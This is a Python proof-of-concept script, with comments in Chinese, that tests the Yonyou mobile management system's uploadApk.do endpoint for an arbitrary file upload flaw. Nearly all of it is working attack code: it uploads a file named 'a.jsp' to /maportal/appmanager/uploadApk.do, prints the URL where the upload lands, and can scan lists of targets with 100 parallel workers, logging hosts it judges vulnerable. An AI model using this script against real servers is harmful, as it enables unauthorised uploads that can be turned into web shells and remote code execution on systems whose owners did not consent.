import requests,re,argparse,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

# 定义横幅
def banner():
    banner = '''
██╗   ██╗██╗   ██╗██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗  █████╗ ██████╗ ██╗  ██╗   ██████╗  ██████╗ 
╚██╗ ██╔╝╚██╗ ██╔╝██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝   ██╔══██╗██╔═══██╗
 ╚████╔╝  ╚████╔╝ ██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║███████║██████╔╝█████╔╝    ██║  ██║██║   ██║
  ╚██╔╝    ╚██╔╝  ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║██╔══██║██╔═══╝ ██╔═██╗    ██║  ██║██║   ██║
   ██║      ██║   ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝██║  ██║██║     ██║  ██╗██╗██████╔╝╚██████╔╝
   ╚═╝      ╚═╝    ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝       

'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="用友 移动管理系统 uploadApk.do 任意文件上传漏洞")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
# 构造poc
def poc(target):
    payload = "/maportal/appmanager/uploadApk.do?pk_obj="
    url = target+payload
    header = {
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Cookie": "JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server",
        "Connection": "close",
    }
    data = (
        "------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\n"
        'Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"\r\n'
        'Content-Type: application/msword\r\n'
        "\r\n"
        'hello\r\n'
        "------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--\r\n"

    )
    result = target +  '/maupload/apk/a.jsp'
    try:
        res = requests.get(url=target,verify=False,timeout=10)
        if res.status_code == 200:
            res1 = requests.post(url=url,headers=header,data=data,verify=False,timeout=10)
            if  '2' in res1.text and res1.status_code == 200:
                print(f"[+]此url{target}存在漏洞,上传后的url为:{result}")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n') 
            else:
                print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()